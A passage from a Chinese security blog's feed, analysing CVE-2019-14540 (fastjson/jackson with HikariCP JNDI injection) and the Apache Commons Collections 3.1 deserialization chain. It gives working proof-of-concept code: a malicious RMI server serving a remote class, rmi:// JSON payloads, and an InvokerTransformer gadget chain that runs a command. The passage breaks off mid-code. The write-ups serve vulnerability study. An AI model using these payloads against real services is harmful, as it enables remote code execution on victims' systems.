&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().startsWith(<span class="string">"mac"</span>)) &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">"No calc for you!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再起一个RMI服务端，动态加载远程class文件:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建RMI Registry，默认监听1099端口</span></span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            String remote_class = <span class="string">"http://127.0.0.1/"</span>;</span><br><span class="line">            <span class="comment">//Reference对象代表存在于JNDI以外的对象的引用</span></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exploit"</span>, <span class="string">"Exploit"</span>, remote_class);</span><br><span class="line">            ReferenceWrapper re = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            <span class="comment">//把Reference对象绑定到Registry，客户端可以通过在Registry查找Exploit获取到re对象</span></span><br><span class="line">            registry.bind(<span class="string">"Exploit"</span>,re);</span><br><span class="line">            System.out.println(<span class="string">"RMI服务已经启动...."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="漏洞环境搭建-amp-复现"><a href="#漏洞环境搭建-amp-复现" class="headerlink" title="漏洞环境搭建&amp;复现"></a>漏洞环境搭建&amp;复现</h3><ul><li>jdk版本：jdk1.8.0_73</li><li>jackson版本：2.10.0</li><li>HikariCP版本：3.3.1</li><li>fastjson版本：1.2.53<br>idea创建maven项目，在pom.xml添加依赖：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0.pr1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.zaxxer/HikariCP --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zaxxer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>HikariCP<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>jackson poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String json = <span class="string">"[\"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;]"</span>;</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(json,Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/28/aTDUmhqfOWn7Rw4.jpg" alt="-w1486"></p><p>fastjson poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjsonEXP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/28/7CKLbq4ag9PtFXv.jpg" alt="-w1352"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从上文中fastjson入门部分我们知道，在解析json数据的时候会自动调用<code>setXX</code>方法，在<code>HikariCP</code>这个组件中，HikariConfig.class中可以看到<code>setMetricRegistry</code>方法调用了<code>getObjectOrPerformJndiLookup</code>方法：<br><img src="https://i.loli.net/2020/01/28/16dujZBEYevVfib.jpg" alt="-w1487"><br>跟进其中，调用了<code>InitialContext.lookup(object)</code><br><img src="https://i.loli.net/2020/01/28/kdZWwJm1tsIj3aQ.jpg" alt="-w1130"><br>很明显的<code>jndi Reference</code>注入。</p><p>所以我们在构造poc的时候，利用fastjson的<code>@type</code>加载该对象<code>com.zaxxer.hikari.HikariConfig</code>，使用<code>metricRegistry</code>属性，去触发<code>setMetricRegistry</code>方法，最终使之加载我们恶意的RMI服务程序。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure></p><p>同样的，在jackson中也有这样的问题：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\<span class="string">"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;]</span></span><br></pre></td></tr></table></figure></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>通过上面的分析，我们也可以发现其实这是多组件组合导致的远程代码执行，需要环境中使用了fastjson或者jackson库，同时还使用了第三方组件<code>HikariCP</code>导致的，而官方的修复也只是将该扩展添加进了黑名单(<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a>、<a href="https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de" target="_blank" rel="noopener">jackson修复commit</a>)。</p><p>参考文章：</p><ul><li><a href="https://curz0n.github.io/2019/09/20/cve-2019-14540/#3-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" target="_blank" rel="noopener">curz0n:CVE-2019-14540远程代码执行漏洞分析&amp;复现</a></li><li><a href="https://b1ue.cn/archives/189.html" target="_blank" rel="noopener">b1ue:Java 反序列化漏洞始末（4）— jackson</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析</title>
    <link href="http://0day.design/2020/01/24/Apache-Commons-Collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/01/24/Apache-Commons-Collections-3.1 反序列化漏洞分析/</id>
    <published>2020-01-24T08:20:00.000Z</published>
    <updated>2020-01-27T02:46:06.559Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>组件下载：<br><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p><p>Idea 新建项目-&gt;选择jdk7—&gt;选择File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;加载下载的组件</p><p><img src="https://i.loli.net/2020/01/24/2DY64UVGfb1dPcH.jpg" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/24/shVGouJlUBDrc4W.jpg" alt="-w1299"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>漏洞点在<code>/commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/InvokerTransformer.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//105行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过实现<code>/commons-collections-3.1-sources.jar!/org/apache/commons/collections/Transformer.java</code> <code>Transformer</code>接口，<code>InvokerTransformer</code>构造方法在实例化的时候传入参数函数方法名以及参数名，<code>transform</code>方法使用java反射机制得以调用任意方法。<br><code>Transformer</code>接口:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>Java反射机制即参数传入一个对象，然后通过<code>getClass</code>、<code>getMethod</code>等方法去获取其所属的类、所拥有的对象。</p></blockquote><p>在Java中一切皆对象，调用系统命令的代码通常为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br></pre></td></tr></table></figure></p><p>可以通过构造这段代码实现命令执行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalObject</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer  invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">"open -a Calculator"</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是我们知道反序列化后一般只需要执行<code>readObject</code>函数即可，如果直接序列化<code>invokerTransformer</code>对象，那么<code>readObject</code>之后的对象还需要主动调用<code>transform(Runtime.getRuntime())</code>函数才能得以命令执行，显然是不太现实的。<br>demo:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123; String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"open -a Calculator"</span>&#125;);</span><br><span class="line">        serialize(invokerTransformer);</span><br><span class="line">        <span class="comment">// 反序列化完了还得调对象的transform方法</span></span><br><span class="line">        InvokerTransformer obj = (InvokerTransformer) unserialize();</span><br><span class="line">        obj.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(InvokerTransformer obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            <span class="keyword">return</span> is.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/24/45Pvw7ryBjRsN9U.jpg" alt="-w1293"></p><h3 id="step2-反射链构造"><a href="#step2-反射链构造" class="headerlink" title="step2: 反射链构造"></a>step2: 反射链构造</h3><p>这意味着<code>Runtime.getRuntime()</code>的调用也需要我们通过反射来进行调用，而<code>InvokerTransformer</code>的<code>tansform</code>函数一次只能进行一次反射，这就需要我们构造一个反射链，最终调用<code>exec</code>函数进行命令执行。</p><p>在 <code>/commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/ChainedTransformer.java</code> 中提供了我们构造一个函数对象调用链的一个方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 109行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>给<code>ChainedTransformer</code>方法传递一个数组，在<code>transform</code>方法里遍历调用其<code>transform</code>方法，并将返回的结果作为下一次<code>transform</code>函数的参数。</p><p>此时可以构造出这样一个poc：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> 